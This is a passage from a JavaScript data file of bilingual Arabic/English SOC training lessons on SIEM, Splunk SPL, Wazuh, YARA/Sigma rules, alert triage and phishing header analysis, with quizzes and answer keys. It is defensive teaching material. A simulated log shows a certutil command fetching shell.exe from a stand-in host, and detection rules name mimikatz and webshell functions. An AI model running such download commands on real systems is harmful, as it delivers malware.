// Master Courses Data Repository - Level 3: Advanced SOC Track
// Course 7: SIEM Systems, Playbooks, DFIR & Career - 12 Comprehensive Lessons
// BasharSec Academy - Master Curriculum

const level3Courses = [
  {
    id: "course-7",
    courseNumber: 7,
    level: "advanced",
    levelNameAr: "المستوى الثالث: متقدم",
    levelNameEn: "Level 3: Advanced",
    levelBadgeColor: "#8B5CF6",
    titleAr: "إتقان أنظمة الـ SIEM، خطط التحقيق (Playbooks)، والاستجابة للحوادث",
    titleEn: "SIEM Systems Mastery, Incident Response Playbooks & Career Prep",
    summaryAr: "المستوى الاحترافي الأسمى: معمارية الـ SIEM ولغة Splunk SPL، منصات Wazuh و Elastic، هندسة الاكتشاف بقواعد YARA و Sigma، منهجية الفرز الاحترافية، و 4 كراسات تشغيل حقيقية (Phishing, Ransomware, AD, Web)، والتحقيق الجنائي الرقمي DFIR ومقابلات العمل والمختبر المنزلي.",
    summaryEn: "Elite advanced track: SIEM architecture, Splunk SPL 20 queries, Wazuh & Elastic, YARA & Sigma detection engineering, 4 real-world Playbooks, DFIR Volatility, and top 50 interview prep.",
    icon: "âš¡",
    duration: "14 ساعة تدريبية",
    lessonsCount: 12,
    badgeAr: "محلل استجابة حوادث متقدم",
    badgeEn: "Senior Incident Responder",
    lessons: [
      {
        id: "lesson-7-1",
        courseId: "course-7",
        number: "7.1",
        titleAr: "معمارية نظام الـ SIEM من الداخل: التجميع (Log Collection)، التحليل والتوحيد (Parsing & Normalization)، الترابط (Correlation)، والتنبيه",
        titleEn: "SIEM Architecture Under the Hood: Log Collection, Ingestion, Parsing, Correlation & Alerting",
        duration: "55 min",
        theoryAr: `
<h3>الدماغ المركزي لغرفة العمليات: كيف يعمل نظام الـ SIEM من الداخل؟</h3>
<p class="lead">نظام الـ SIEM (Security Information and Event Management) هو قلب مركز العمليات الأمنية. وظيفته ليست مجرد تخزين السجلات كقرص صلب، بل تحويل مليارات الأحداث العشوائية غير المفهومة إلى رؤى أمنية واضحة وتنبيهات حية تكشف الاختراقات في ثوانٍ.</p>

<h4>مراحل عمل الـ SIEM الأربع الأساسية (The SIEM Pipeline):</h4>
<ol>
  <li><strong>1. التجميع والاستقبال (Log Collection & Ingestion):</strong>
    <ul>
      <li><strong>عبر الوكلاء (Agent-based):</strong> تثبيت برنامج خفيف مثل Splunk Universal Forwarder أو Wazuh Agent أو Winlogbeat على كل جهاز وخادم لجمع السجلات محلياً وإرسالها مشفرة.</li>
      <li><strong>بدون وكلاء (Agentless):</strong> إرسال أجهزة الشبكة والفايروول لسجلاتها مباشرة عبر بروتوكول Syslog (UDP/TCP 514) أو استعلام واجهات APIs السحابية.</li>
    </ul>
  </li>
  <li><strong>2. التحليل والتطبيع (Parsing & Normalization):</strong>
    <p>كل جهاز يكتب السجل بطريقته؛ الفايروول يكتب <code>src=1.2.3.4</code> بينما ويندوز يكتب <code>IpAddress: 1.2.3.4</code>. يقوم محرك التحليل (Parser) بتفكيك النص وتوحيد كل هذه المسميات تحت حقل قياسي موحد يسمى <code>src_ip</code> وفق نماذج بيانات معيارية (مثل Splunk CIM أو Elastic Common Schema - ECS).</p>
  </li>
  <li><strong>3. الفهرسة والتخزين (Indexing & Storage):</strong>
    <p>ضغط البيانات وفهرستها لتمكين المحلل من البحث في مليارات الأسطر واسترجاع النتائج في أقل من ثانية واحدة.</p>
  </li>
  <li><strong>4. محرك قواعد الارتباط والتنبيه (Correlation Engine & Alerting):</strong>
    <p>الذكاء الحقيقي؛ يربط أحداثاً تبدو منفصلة: <em>"إذا سجل خادم الويب 50 محاولة دخول فاشلة من IP خارجي (حدث 1)، وتلاها في نفس الدقيقة اتصال مشبوه على منفذ SSH الداخلي من نفس الـ IP (حدث 2)، وكان الحساب المستهدف Admin (حدث 3) -> أطلق فوراً تنبيهاً حرجاً برقم تذكرة في طابور الـ SOC!"</em>.</p>
  </li>
</ol>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي محرك الارتباط في الـ SIEM (Correlation Engine Simulator)</span>
    <h4>مشاهدة توليد تنبيه ارتباطي نتيجة دمج سجلين منفصلين</h4>
  </div>
  <p>شاهد كيف يدمج محرك الارتباط سجل الفايروول مع سجل خادم الدومين لإطلاق تنبيه:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> siem-correlation-view</div>
    <pre class="terminal-code">[EVENT A - Perimeter FW]: Inbound scan on port 3389 from 198.51.100.44 (04:12:01 UTC)
[EVENT B - Internal DC] : Event 4625 Failed RDP logon for user "Admin" from 198.51.100.44 (04:12:05 UTC)
[CORRELATION RULE MATCH]: Rule "External RDP Brute Force Attempt" triggered!
-> INCIDENT TICKET AUTO-CREATED: INC-2026-9041 (Severity: HIGH | Assigned to: Tier 1 Queue)</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هي الفائدة الجوهرية لمرحلة 'التطبيع والتوحيد' (Normalization) داخل نظام الـ SIEM؟",
          questionEn: "What is the primary objective of Normalization in a SIEM?",
          optionsAr: [
            "توحيد مسميات الحقول المختلفة القادمة من مصادر متباينة (مثل جعل src و SourceIP و ip.src كلها src_ip) لتمكين كتابة قواعد بحث موحدة",
            "حذف 90% من السجلات لتوفير مساحة التخزين",
            "إعادة تشغيل أجهزة الشبكة تلقائياً",
            "تغيير كلمات مرور المستخدمين كل نصف ساعة"
          ],
          optionsEn: [
            "Standardizing diverse field names across vendor logs into unified schemas (e.g., CIM/ECS) for universal queries",
            "Deleting 90% of logs to save disk",
            "Restarting switches automatically",
            "Resetting passwords every 30 minutes"
          ],
          correctIndex: 0,
          explanationAr: "تضمن عملية Normalization أن المحلل يستطيع كتابة استعلام واحد مثل `src_ip=10.0.0.1` ليبحث في نفس اللحظة عبر سجلات Palo Alto وويندوز ولينكس وسيسكو دون الحاجة لكتابة استعلام مخصص لكل مصنع."
        }
      },
      {
        id: "lesson-7-2",
        courseId: "course-7",
        number: "7.2",
        titleAr: "إتقان Splunk لمحلل الـ SOC: لغة البحث SPL من الصفر مع 20 استعلاماً حقيقياً لكشف الاختراقات",
        titleEn: "Splunk for SOC Analysts: Search Processing Language (SPL) Mastery & 20 Real Detection Queries",
        duration: "55 min",
        theoryAr: `
<h3>سيف المحلل البتار: لغة البحث SPL (Search Processing Language) في Splunk</h3>
<p class="lead">منصة Splunk هي ملكة الـ SIEM في كبرى بنوك وشركات العالم؛ إتقان لغة SPL هو المهارة رقم 1 التي يختبرك فيها كل مدير SOC في مقابلات العمل التقنية. لغة SPL تشبه خط أنابيب لينكس (Pipes |)؛ تبدأ بالبحث العام وتصفي البيانات خطوة بخطوة.</p>

<h4>أهم أوامر لغة SPL الأساسية:</h4>
<ul>
  <li><code>search:</code> البحث الأولي في الفهرس ومصدر البيانات (مثل: <code>index=windows sourcetype=WinEventLog:Security</code>).</li>
  <li><code>where / eval:</code> تطبيق شروط برمجية أو حساب قيم جديدة (مثل: <code>| eval duration_min=duration/60</code>).</li>
  <li><code>stats:</code> الحسابات الإحصائية والتجميع (<code>count, sum, avg, values, dc</code>). أمر <code>dc()</code> يحسب القيم الفريدة (Distinct Count).</li>
  <li><code>table:</code> تنسيق النتائج وعرض حقول محددة فقط في جدول أنيق.</li>
  <li><code>sort:</code> ترتيب النتائج تصاعدياً أو تنازلياً (<code>sort -count</code>).</li>
  <li><code>dedup:</code> حذف السجلات المكررة وإبقاء نسخة واحدة فريدة.</li>
  <li><code>top / rare:</code> عرض أكثر أو أقل القيم تكراراً تلقائياً.</li>
  <li><code>rex:</code> استخراج حقول جديدة مخصصة من النصوص غير المهيكلة باستخدام التعبيرات القياسية (Regex).</li>
  <li><code>transaction:</code> تجميع الأحداث المترابطة التي تشترك في معرف معين خلال فترة زمنية محددة.</li>
</ul>

<h4>نماذج من الـ 20 استعلاماً الميدانياً لكشف الاختراقات في Splunk:</h4>
<pre><code class="language-text"># 1. كشف هجوم Password Spraying (أكثر من 10 مستخدمين فاشلين من نفس الـ IP):
index=windows EventCode=4625
| stats dc(TargetUserName) as unique_users, count by src_ip
| where unique_users > 10
| sort -unique_users

# 2. كشف تشغيل أوامر PowerShell المشفرة بـ Base64:
index=windows EventCode=4688 (Process_Command_Line="*-enc*" OR Process_Command_Line="*FromBase64String*")
| table _time, host, New_Process_Name, Process_Command_Line, Creator_Process_Name

# 3. كشف مسح سجل تدقيق الأمان فوراً (Event 1102):
index=windows EventCode=1102
| table _time, host, TargetUserName, Message

# 4. كشف استعلامات DNS الشاذة الطويلة (DNS Tunneling):
index=network sourcetype=dns
| eval query_len=len(query)
| where query_len > 60
| stats count by query, src_ip
| sort -query_len</code></pre>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي تشغيل استعلامات Splunk SPL (Splunk Console Simulator)</span>
    <h4>تنفيذ استعلام SPL لكشف استخدام أداة Certutil لتنزيل برمجيات خبيثة</h4>
  </div>
  <p>شاهد مخرجات تشغيل الاستعلام في منصة Splunk:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> splunk-spl-search</div>
    <pre class="terminal-code">SPL QUERY: index=endpoint EventCode=1 (CommandLine="*certutil*" AND CommandLine="*-urlcache*")
| table _time, host, User, ParentImage, CommandLine

_time                host        User         ParentImage     CommandLine
2026-11-07 06:12:04  FIN-SRV-01  CORP\admin   cmd.exe         certutil.exe -urlcache -split -f http://bad.ru/shell.exe C:\shell.exe
[MATCH FOUND: 1 EVENT RETURNED - MALICIOUS LOLBIN DOWNLOAD VERIFIED]</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('splunk-search \"index=windows EventCode=4625 | stats count by src_ip\"', 'standalone-term-body'); app.showToast('تم تنفيذ استعلام Splunk', 'info');">تشغيل استعلام فحص محاولات الدخول الفاشلة</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "في لغة Splunk SPL، ما هي الدالة الإحصائية المستخدمة لحساب عدد المستخدمين الفريدين المختلفين (Distinct Count) داخل استعلام `stats`؟",
          questionEn: "Which Splunk SPL statistical function counts unique values?",
          optionsAr: [
            "`dc(TargetUserName)` (Distinct Count)",
            "`sum(TargetUserName)`",
            "`avg(TargetUserName)`",
            "`delete(TargetUserName)`"
          ],
          optionsEn: [
            "dc(TargetUserName) (Distinct Count)",
            "sum(TargetUserName)",
            "avg(TargetUserName)",
            "delete(TargetUserName)"
          ],
          correctIndex: 0,
          explanationAr: "دالة `dc()` في لغة SPL تعني Distinct Count؛ وهي الدالة الأساسية المستخدمة لكشف هجمات Password Spraying لأنها تحسب عدد أسماء المستخدمين الفريدين وليس مجرد عدد المحاولات الإجمالي."
        }
      },
      {
        id: "lesson-7-3",
        courseId: "course-7",
        number: "7.3",
        titleAr: "إتقان Wazuh SIEM & XDR و Elastic (ELK Stack / KQL): شرح الواجهة، القواعد، وفلاتر البحث في Kibana",
        titleEn: "Wazuh SIEM/XDR & Elastic (ELK Stack / KQL): Architecture, XML Rules & Kibana Search Filters",
        duration: "55 min",
        theoryAr: `
<h3>العمالقة مفتوحة المصدر: منظومة Wazuh الشاملة وحزمة Elastic المتطورة</h3>
<p class="lead">بينما تكلف منصات Splunk مئات الآلاف من الدولارات، تعتمد آلاف الشركات حول العالم على <strong>Wazuh</strong> كنظام SIEM & XDR مجاني مفتوح المصدر وفائق القوة، مدمجاً مع <strong>Elasticsearch & Kibana</strong> لإدارة وتصور البيانات.</p>

<h4>1. معمارية نظام Wazuh الميدانية</h4>
<ul>
  <li><strong>Wazuh Agent:</strong> يثبت على أجهزة الويندوز ولينكس والماك؛ يراقب سجلات النظام، يتحقق من سلامة الملفات (FIM - File Integrity Monitoring)، يكتشف الثغرات المفقودة، ويراقب التعديلات على مفاتيح الريجستري.</li>
  <li><strong>Wazuh Manager:</strong> الخادم المركزي؛ يحلل السجلات القادمة من الوكلاء ويطابقها مع مصفوفة ضخمة من قواعد الـ XML المدمجة ويصنف التهديدات بمستويات خطورة من 1 إلى 16 (المستوى 12 فأعلى يعتبر حرجاً جداً).</li>
  <li><strong>Kibana / Wazuh Dashboard:</strong> لوحة التحكم الرسومية المتقدمة التي تعرض الخرائط والتنبيهات وإحصائيات الامتثال لمعايير PCI-DSS و NIST.</li>
</ul>

<h4>2. لغة استعلامات إيلاستيك (KQL - Kibana Query Language)</h4>
<p>لغة البحث السريعة في Kibana لمحلل الـ SOC؛ تتميز ببساطة التعبير:</p>
<pre><code class="language-text"># البحث عن محاولات تسجيل الدخول الفاشلة في ويندوز:
winlog.event_id: 4625 and winlog.event_data.SubStatus: "0xC000006A"

# البحث عن أوامر باور شيل في حواسيب قسم المالية:
host.name: "FIN-*" and process.name: "powershell.exe" and process.args: "-enc"</code></pre>

<h4>3. بنية قواعد Wazuh بصيغة XML:</h4>
<pre><code class="language-xml">&lt;rule id="100002" level="12"&gt;
  &lt;if_sid&gt;60106&lt;/if_sid&gt;
  &lt;field name="win.eventdata.image"&gt;mimikatz.exe&lt;/field&gt;
  &lt;description&gt;CRITICAL: Mimikatz credential dumper execution detected on endpoint&lt;/description&gt;
  &lt;mitre&gt;
    &lt;id&gt;T1003.001&lt;/id&gt;
  &lt;/mitre&gt;
&lt;/rule&gt;</code></pre>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فحص تنبيهات Wazuh (Wazuh Dashboard Simulator)</span>
    <h4>مراقبة تنبيه تغيير ملف نظام حساس عبر محرك FIM في Wazuh</h4>
  </div>
  <p>تفحص تفاصيل التنبيه الصادر عن عميل Wazuh المثبت على خادم لينكس:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> wazuh-alert-viewer</div>
    <pre class="terminal-code">Rule ID: 550 (Level: 10 - Integrity checksum changed)
Agent: web-prod-01 (ID: 004 - Ubuntu 22.04 LTS)
File: /etc/shadow
Modification: MD5 checksum changed from a4b1... to 9f20...
File owner: root | Permissions: 0640
[ALERT] System integrity alert: /etc/shadow modified outside maintenance window!</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "في نظام Wazuh، ما هي الخاصية المسؤولة عن مراقبة أي تعديل أو مسح أو إضافة على ملفات النظام الحساسة ومفاتيح الريجستري ومقارنة بصمات الهاش (Hash Checksums) الخاصة بها؟",
          questionEn: "Which Wazuh feature monitors file and registry integrity changes?",
          optionsAr: [
            "خاصية مراقبة سلامة الملفات (FIM - File Integrity Monitoring)",
            "خاصية تسريع المعالج (CPU Overclocking)",
            "خاصية تنزيل الأغاني",
            "خاصية تعدين البيتكوين"
          ],
          optionsEn: [
            "File Integrity Monitoring (FIM)",
            "CPU Overclocking",
            "Music downloader",
            "Bitcoin mining"
          ],
          correctIndex: 0,
          explanationAr: "خاصية FIM (File Integrity Monitoring) تحسب هاشات الملفات الحساسة (مثل /etc/passwd أو ملفات DLL في System32) وتطلق تنبيهاً فورياً عند حدوث أي تعديل غير مصرح به حتى لو كان بايت واحد."
        }
      },
      {
        id: "lesson-7-4",
        courseId: "course-7",
        number: "7.4",
        titleAr: "هندسة الاكتشاف وقواعد الـ YARA & Sigma Rules: كيف تكتب قاعدة YARA لكشف ملف خبيث، وقاعدة Sigma مستقلة عن نوع الـ SIEM؟",
        titleEn: "Detection Engineering: Writing YARA Rules for Malware & Generic Sigma Rules for SIEM",
        duration: "55 min",
        theoryAr: `
<h3>هندسة الاكتشاف المتقدمة: كتابة التوقيعات والقواعد المستقلة عن الأنظمة</h3>
<p class="lead">لا يعتمد صائدو التهديدات (Threat Hunters) على قواعد جاهزة يشتريها الـ SOC فقط؛ بل يكتبون قواعد كشف مخصصة لمطاردة العينات الخبيثة الجديدة. لغتان تحكمان هذا المجال عالمياً: <strong>YARA</strong> لكشف الملفات والذاكرة، و <strong>Sigma</strong> لكشف السجلات في أي نظام SIEM.</p>

<h4>1. لغة YARA (التعرف على أنماط البرمجيات الخبيثة)</h4>
<p>تسمى "أداة النمط للمحللين"؛ تبحث في محتويات الملفات أو الذاكرة العشوائية عن نصوص وسلاسل بايتات ست عشرية محددة. تتكون قاعدة YARA من 3 أقسام:</p>
<ul>
  <li><code>meta:</code> معلومات توثيقية عن القاعدة (اسم الكاتب، التاريخ، رقم التذكرة).</li>
  <li><code>strings:</code> المتغيرات والكلمات أو البايتات المطلوب مطابقتها (نصوص عادية، نصوص بنوع nocase، أو بايتات Hexadecimal).</li>
  <li><code>condition:</code> الشرط المنطقي الذي إذا تحقق انطلق التنبيه (مثل: مطابقة توقيع MZ ووجود كلمتين خبيثتين معاً).</li>
</ul>

<h4>نموذج قاعدة YARA حقيقية لكشف قذيفة ويب خبيثة:</h4>
<pre><code class="language-text">rule Detect_PHP_Webshell_Backdoor {
    meta:
        description = "Detects common PHP webshell execution functions"
        author = "SOC Analyst BasharSec"
        date = "2026-11-07"
    strings:
        $php_tag = "&lt;?php"
        $eval = "eval(" nocase
        $base64 = "base64_decode(" nocase
        $cmd = "passthru(" nocase
    condition:
        $php_tag and ($eval or ($base64 and $cmd))
}</code></pre>

<h4>2. لغة قواعد Sigma (المعيار الموحد للسجلات)</h4>
<p>تعتبر Sigma بمثابة "مترجم لغة السجلات العام" (مثل لغة C++ في البرمجة)؛ تكتب القاعدة مرة واحدة بصيغة YAML، وتقوم أداة <code>sigmac</code> أو <code>pySigma</code> بتحويلها تلقائياً إلى استعلام Splunk SPL، أو استعلام Elastic KQL، أو استعلام Microsoft Sentinel (KQL)، أو استعلام QRadar AQL دون إعادة كتابتها!</p>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فحص قواعد YARA (YARA Scanner Simulation)</span>
    <h4>فحص ملف مشبوه في مجلد التحميلات بواسطة محرك YARA</h4>
  </div>
  <p>شاهد تنفيذ فحص قاعدة YARA على عينة في الذاكرة:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> yara-scanner-runner</div>
    <pre class="terminal-code">$ yara -m detect_webshell.yar /var/www/uploads/test_avatar.php
Detect_PHP_Webshell_Backdoor [/var/www/uploads/test_avatar.php]
  0x14:$eval: "eval("
  0x38:$base64: "base64_decode("
[MATCH CONFIRMED]: File matched 2 malicious strings. Classification: Malicious Web Shell!</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هي الفائدة الثورية لاستخدام قواعد Sigma Rules في هندسة الاكتشاف بمراكز العمليات الأمنية؟",
          questionEn: "What is the revolutionary benefit of Sigma Rules in Detection Engineering?",
          optionsAr: [
            "كتابة قاعدة الكشف مرة واحدة بصيغة عامة موحدة (YAML)، مع إمكانية تحويلها تلقائياً لأي لغة استعلام في أي نظام SIEM (Splunk, Elastic, Sentinel, QRadar)",
            "مسح الفيروسات من الهواتف المحمولة في ثانية واحدة",
            "الاستغناء عن محللي الـ SOC نهائياً",
            "تقليل سرعة استهلاك الإنترنت في الشركة"
          ],
          optionsEn: [
            "Write detection logic once in generic YAML, with automated conversion to any SIEM query language (Splunk SPL, Elastic KQL, Sentinel)",
            "Phone virus removal",
            "Eliminating analysts",
            "Reducing internet bandwidth"
          ],
          correctIndex: 0,
          explanationAr: "حلت Sigma مشكلة احتكار مصنعي الـ SIEM؛ فيمكن لفرق الأمن السيبراني في العالم مشاركة قواعد الاكتشاف المكتوبة بـ Sigma وتطبيقها فوراً في منصاتهم أياً كان نوع الـ SIEM المستخدم لديهم."
        }
      },
      {
        id: "lesson-7-5",
        courseId: "course-7",
        number: "7.5",
        titleAr: "منهجية الفرز الاحترافية (SOC Alert Triage): الخطوات الـ 7 للتحقيق في أي تنبيه وتصنيفه (True Positive, False Positive, Benign True Positive)",
        titleEn: "Professional SOC Alert Triage Methodology: The 7-Step Investigation Framework (TP, FP & BTP)",
        duration: "55 min",
        theoryAr: `
<h3>منهجية التحقيق الصارمة: كيف تفرز 100 تنبيه يومياً دون ارتباك أو خطأ؟</h3>
<p class="lead">أكبر تحدٍ يواجه محلل الـ SOC هو "إرهاق التنبيهات" (Alert Fatigue). امتلاك منهجية ذهبية ثابتة مكونة من 7 خطوات يحميك من التردد ويضمن تقييماً عادلاً ودقيقاً لكل تذكرة.</p>

<h4>الخطوات السبع المعيارية لفرز أي تنبيه أمني (The 7 Triage Steps):</h4>
<ol>
  <li><strong>1. فهم منطق القاعدة والمحفز (Understand the Trigger Logic):</strong> اقرأ اسم القاعدة وما هو الشرط الذي أدى لانطلاقها؛ لا تبدأ بالبحث عشوائياً قبل أن تعرف بالضبط ما الذي لفت انتباه الـ SIEM.</li>
  <li><strong>2. التحقق من السياق الزمني والمكاني (Validate Scope & Timing):</strong> متى وقع الحدث؟ ما هو اسم الحاسوب والمستخدم؟ ما هي إدارة الموظف؟ هل المستخدم مسافر أم في إجازة؟</li>
  <li><strong>3. فحص سمعة المؤشرات الخارجية (Enrich Indicators via OSINT):</strong> فحص عناوين الـ IP والنطاقات الخارجية في VirusTotal و AbuseIPDB؛ هل العنوان ينتمي لخوادم استضافة مشبوهة (Bulletproof Hosting) أم لخدمات مايكروسوفت السحابية المعتمدة؟</li>
  <li><strong>4. فحص الأصول والعمليات داخلياً (Inspect Internal Process & Host):</strong> مراجعة شجرة العمليات في الـ EDR وسطر الأوامر المنفذ ومسار الملف والهاش.</li>
  <li><strong>5. البحث عن تكرار السلوك في الشبكة (Pivot & Scope):</strong> هل ظهر هذا الهاش أو العنوان على أجهزة أخرى في الشركة خلال الساعات الماضية (أم جهاز واحد فقط)؟</li>
  <li><strong>6. التواصل والتحقق البشري (User Verification):</strong> إذا كان السلوك قد يكون مبرراً (مثل قيام مهندس الشبكات بتجربة أداة Putty)، يتم التواصل معه أو مع مديره للتأكد هل هو نشاط مصرح به.</li>
  <li><strong>7. اتخاذ القرار والتصنيف النهائي مع التوثيق (Final Disposition):</strong>
    <ul>
      <li><strong>إيجابي حقيقي (True Positive - TP):</strong> نشاط خبيث فعلي -> عزل الجهاز وتصعيد الحادث فوراً لـ Tier 2.</li>
      <li><strong>إيجابي كاذب (False Positive - FP):</strong> نشاط سليم مشروع أطلق تنبيهاً خاطئاً -> إغلاق التذكرة مع التوصية بضبط القاعدة (Rule Tuning).</li>
      <li><strong>إيجابي حميد (Benign True Positive - BTP):</strong> نشاط مريب الشبه نُفذ لأغراض إدارية مصرح بها -> إغلاق مع التوثيق.</li>
    </ul>
  </li>
</ol>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فرز التنبيهات التفاعلي (Interactive Triage Console)</span>
    <h4>فرز تنبيه اتصال بورت RDP وتطبيق الخطوات السبع</h4>
  </div>
  <p>تفحص التنبيه وطبق عليه منهجية التحقق لتصنيفه:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> soc-triage-workspace</div>
    <pre class="terminal-code">ALERT: Inbound RDP connection from external IP 185.220.101.4 to FIN-PC-01
Enrichment Data:
- Source IP Reputation: Tor Exit Node (Abuse Score: 100%)
- User Account: Guest (Account was disabled 6 months ago!)
- Time of Day: 03:15 AM (Non-business hours)
CLASSIFICATION REQUIRED: [TP | FP | BTP]</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('triage-classify --alert 9041 --status TP', 'standalone-term-body'); app.showToast('تم تصنيف التنبيه كـ True Positive حرج وتصعيده', 'success');">تصنيف كـ True Positive وتفعيل خطة الطوارئ</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "أثناء فرز تنبيه، تبين أن سكريبت PowerShell المريب قد تم تشغيله بواسطة مهندس تكنولوجيا المعلومات المعتمد بالشركة لإجراء صيانة مجدولة ومصرح بها مسبقاً، فما هو التصنيف الدقيق لهذه الحالة؟",
          questionEn: "What is the correct classification when a script is run by IT staff for authorized maintenance?",
          optionsAr: [
            "إيجابي حقيقي غير ضار / حميد (Benign True Positive - BTP)",
            "إيجابي كاذب ناتج عن فيروس خطير (False Positive Virus)",
            "هجوم إرهابي سيبراني عاجل",
            "اختراق بواسطة قذائف الويب"
          ],
          optionsEn: [
            "Benign True Positive (BTP)",
            "False Positive Virus",
            "Urgent cyber terrorist attack",
            "Web shell breach"
          ],
          correctIndex: 0,
          explanationAr: "يصنف هذا الحدث كـ Benign True Positive؛ فالقاعدة عملت بشكل صحيح واكتشفت نشاطاً مشبوهاً بالفعل (لذلك هو True)، ولكنه تم لأغراض عمل شرعية مصرح بها ولا يمثل ضرراً (لذلك هو Benign)."
        }
      },
      {
        id: "lesson-7-6",
        courseId: "course-7",
        number: "7.6",
        titleAr: "Playbook 1 (تحقيق كامل في Phishing Email): تحليل ترويسات الإيميل (SPF, DKIM, DMARC, Return-Path, Received, Message-ID)، فك المرفقات والروابط بأمان، والبحث في الـ SIEM عمن ضغط الرابط",
        titleEn: "Playbook 1: Phishing Investigation - Email Headers (SPF, DKIM, DMARC), Safe Unpacking & SIEM Hunting",
        duration: "55 min",
        theoryAr: `
<h3>كراسة التحقيق الميداني 1: تفكيك هجمات التصيد الاحتيالي من الألف إلى الياء</h3>
<p class="lead">أكثر من 90% من حوادث الاختراق العالمية تبدأ برسالة بريد إلكتروني مخادعة (Phishing). في هذا الـ Playbook، يتعلم محلل الـ SOC كيفية تشريح ملف الإيميل الخام (<code>.eml</code> أو <code>.msg</code>) واستخراج الحقيقة الجنائية.</p>

<h4>1. تشريح ترويسات البريد الإلكتروني (Email Header Forensics):</h4>
<ul>
  <li><strong>Received:</strong> أهم حقل جنائي؛ يسجل خط سير الرسالة والخوادم التي مرت بها من الأسفل للأعلى (أدنى سطر Received يمثل الخادم الأصلي الذي انطلقت منه الرسالة!).</li>
  <li><strong>Return-Path:</strong> العنوان الحقيقي الذي ستعود إليه ردود الإيميل (غالباً ما يختلف عن عنوان <code>From</code> الظاهر للضحية!).</li>
  <li><strong>Authentication-Results:</strong> النتيجة الثلاثية للتحقق من مصداقية النطاق:
    <ul>
      <li><strong>SPF (Sender Policy Framework):</strong> هل خادم الـ IP الذي أرسل الإيميل مصرح له في سجلات DNS بالنشر باسم هذا النطاق؟</li>
      <li><strong>DKIM (DomainKeys Identified Mail):</strong> هل الرسالة موقعة رقمياً بمفتاح سري يثبت عدم تعديل محتواها أثناء النقل؟</li>
      <li><strong>DMARC:</strong> السياسة التي تفرضها الشركة صاحبة النطاق في حال فشل SPF أو DKIM (رفض <code>reject</code> أو حجر <code>quarantine</code>).</li>
    </ul>
  </li>
</ul>

<h4>2. فك وفحص المرفقات والروابط بأمان (Safe Extraction):</h4>
<ul>
  <li>لا تنقر على الروابط مطلقاً؛ بل انسخ الرابط وشوهه (Defang) ثم افحصه في <code>URLScan.io</code> أو <code>VirusTotal</code>.</li>
  <li>استخرج هاش الـ SHA256 للمرفق وافحصه في قواعد استخبارات التهديد، أو شغله داخل بيئة عزل سحابية تفاعلية (Any.Run) لمراقبة سلوكه.</li>
</ul>

<h4>3. البحث في الـ SIEM وتحديد نطاق الضرر (Scope Assessment):</h4>
<p>بمجرد ثبوت خباثة الرابط أو الإيميل، ينفذ المحلل استعلام SIEM لمعرفة:</p>
<ol>
  <li>من هم جميع الموظفين الذين استلموا نفس الرسالة؟ (لحذفها من صناديقهم فوراً عبر خادم Exchange).</li>
  <li>هل قام أي موظف بالنقر على الرابط وتأسيس اتصال خارجي؟ (عبر فحص سجلات الـ Proxy والـ Firewall).</li>
  <li>إذا نقر موظف على الرابط؛ يتم فوراً إعادة تعيين كلمة سره وتفقد جهازه عبر الـ EDR.</li>
</ol>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فحص ترويسات الإيميل (Email Header Analyzer)</span>
    <h4>كشف تزوير بريد إلكتروني يدعي صدوره من بنك معتمد</h4>
  </div>
  <p>تفحص ترويسات الرسالة الملتقطة في بوابة البريد الإلكتروني:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> email-header-inspector</div>
    <pre class="terminal-code">From: "Global Bank Support" <security@globalbank.com>  <-- DISPLAY NAME SPOOFED!
Return-Path: <bounce@evil-attacker-host.xyz>          <-- ACTUAL SENDER DOMAIN!
Received: from mail.evil-attacker-host.xyz (198.51.100.89)
Authentication-Results:
  spf=fail (sender IP 198.51.100.89 not authorized for globalbank.com)
  dkim=none (no valid digital signature found)
  dmarc=fail (p=quarantine)
[CRITICAL ALERT] High-Confidence Phishing Email: Spoofed Bank sender with FAILED SPF/DMARC!</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('siem-hunt --domain evil-attacker-host.xyz', 'standalone-term-body'); app.showToast('تم البحث في الـ SIEM عمن استلم هذا الإيميل', 'info');">البحث في الـ SIEM عن المستلمين المتأثرين</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "في ترويسات البريد الإلكتروني (Email Headers)، إذا أظهر فحص `Authentication-Results` نتيجة `spf=fail`، فماذا يعني ذلك تقنياً لمحلل الـ SOC؟",
          questionEn: "What does spf=fail indicate in email headers?",
          optionsAr: [
            "خادم البريد الذي أرسل الرسالة ليس مصرحاً له في سجلات DNS للنطاق بإرسال إيميلات نيابة عنه، مما يدل على تزوير وانتحال هوية الراسل (Email Spoofing)",
            "الرسالة تحتوي على صورة عالية الجودة",
            "المستلم نسي شحن هاتفه المحمول",
            "خادم الويب يعمل بسرعة فائقة"
          ],
          optionsEn: [
            "The sending IP is not authorized in DNS records to send on behalf of this domain, indicating email spoofing",
            "Contains high quality images",
